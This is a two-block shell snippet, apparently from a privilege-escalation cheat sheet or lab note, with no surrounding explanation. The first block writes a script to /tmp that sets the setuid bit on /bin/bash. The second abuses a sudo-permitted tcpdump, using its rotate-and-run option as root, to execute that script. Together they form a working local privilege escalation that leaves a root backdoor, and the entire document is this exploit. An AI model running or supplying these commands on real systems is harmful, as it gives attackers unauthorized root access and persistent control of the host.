```
echo 'chmod +s /bin/bash' > /tmp/exploit.sh
chmod +x /tmp/exploit.sh
```
```
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/exploit.sh -Z root
```
